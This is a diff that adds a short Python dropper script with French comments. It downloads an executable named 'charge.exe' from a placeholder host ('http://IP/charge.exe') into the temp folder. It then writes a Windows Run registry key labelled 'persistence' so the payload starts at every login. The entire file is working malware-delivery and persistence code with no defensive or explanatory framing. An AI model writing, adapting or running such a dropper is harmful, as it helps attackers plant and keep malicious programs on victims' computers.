@@ -1,0 +1,27 @@
+#!/usr/bin/python
+#coding: utf-8
+
+import requests, wget, os, tempfile, _winreg
+
+
+
+#Ensemble des paramètres
+PathTemp = tempfile.gettempdir()
+rkey = "persistence"
+vkey = os.path.expandvars(r'%APPDATA%\AppData\Local\Temp\charge.exe')
+REG_PATH = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+
+#Permet de download charge + le stock dans le dossier %TEMP%
+url='http://IP/charge.exe'
+r = requests.get(url, allow_redirects=True)
+wget.download(url, PathTemp)
+
+#Creation Cle register for persistence + vérification si déjà présente
+try:
+    _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
+    registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
+    _winreg.SetValueEx(registry_key, rkey, 0, _winreg.REG_SZ, vkey )
+    _winreg.CloseKey(registry_key)
+except WindowsError :
+        pass
